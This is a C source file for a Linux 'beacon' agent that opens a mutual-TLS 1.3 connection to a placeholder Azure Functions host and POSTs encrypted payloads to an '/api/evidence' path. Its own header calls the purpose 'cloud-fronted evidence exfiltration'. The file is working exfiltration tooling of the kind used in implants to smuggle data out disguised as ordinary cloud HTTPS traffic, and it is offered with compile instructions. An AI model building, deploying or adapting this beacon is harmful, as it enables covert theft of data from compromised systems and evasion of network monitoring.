/*
 * JOCKY Spectre Agent — Linux mTLS Beacon
 * OpenSSL-based client for cloud-fronted evidence exfiltration.
 * Connects to Azure Functions endpoint over TLS 1.3 with client cert.
 *
 * Compiled with: gcc -O2 beacon.c -o beacon -lssl -lcrypto
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define BEACON_HOST     "yourfunction.azurewebsites.net"
#define BEACON_PORT     443
#define BEACON_PATH     "/api/evidence"

typedef struct {
    SSL_CTX     *ctx;
    SSL         *ssl;
    int         sockfd;
    char        channel_id[13];
    unsigned char session_key[32];
} beacon_ctx_t;

/* Initialize OpenSSL with TLS 1.3 and mTLS client certificate */
static int beacon_init_ssl(beacon_ctx_t *bctx, const char *cert_path,
                            const char *key_path) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    const SSL_METHOD *method = TLS_client_method();
    bctx->ctx = SSL_CTX_new(method);
    if (!bctx->ctx) return -1;

    /* Enforce TLS 1.3 minimum */
    SSL_CTX_set_min_proto_version(bctx->ctx, TLS1_3_VERSION);

    /* Load client certificate for mTLS */
    if (SSL_CTX_use_certificate_file(bctx->ctx, cert_path,
                                      SSL_FILETYPE_PEM) <= 0)
        return -1;

    if (SSL_CTX_use_PrivateKey_file(bctx->ctx, key_path,
                                     SSL_FILETYPE_PEM) <= 0)
        return -1;

    if (!SSL_CTX_check_private_key(bctx->ctx))
        return -1;

    return 0;
}

/* Establish TCP connection to cloud endpoint */
static int beacon_connect(beacon_ctx_t *bctx) {
    struct addrinfo hints = { .ai_family = AF_INET, .ai_socktype = SOCK_STREAM };
    struct addrinfo *res;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", BEACON_PORT);

    if (getaddrinfo(BEACON_HOST, port_str, &hints, &res) != 0)
        return -1;

    bctx->sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (bctx->sockfd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    if (connect(bctx->sockfd, res->ai_addr, res->ai_addrlen) != 0) {
        close(bctx->sockfd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);

    /* Wrap socket with TLS */
    bctx->ssl = SSL_new(bctx->ctx);
    SSL_set_fd(bctx->ssl, bctx->sockfd);
    SSL_set_tlsext_host_name(bctx->ssl, BEACON_HOST);

    if (SSL_connect(bctx->ssl) <= 0)
        return -1;

    return 0;
}

/* Send evidence payload as HTTP POST with AES-256 encrypted body */
int beacon_send(beacon_ctx_t *bctx, const unsigned char *payload,
                size_t payload_size) {
    char header[512];
    int header_len = snprintf(header, sizeof(header),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "X-Channel-ID: %s\r\n"
        "Content-Length: %zu\r\n"
        "\r\n",
        BEACON_PATH, BEACON_HOST, bctx->channel_id, payload_size);

    if (SSL_write(bctx->ssl, header, header_len) <= 0)
        return -1;

    if (SSL_write(bctx->ssl, payload, (int)payload_size) <= 0)
        return -1;

    /* Read response status */
    char response[256];
    SSL_read(bctx->ssl, response, sizeof(response) - 1);

    return 0;
}

void beacon_close(beacon_ctx_t *bctx) {
    if (bctx->ssl) {
        SSL_shutdown(bctx->ssl);
        SSL_free(bctx->ssl);
    }
    if (bctx->sockfd >= 0)
        close(bctx->sockfd);
    if (bctx->ctx)
        SSL_CTX_free(bctx->ctx);
}
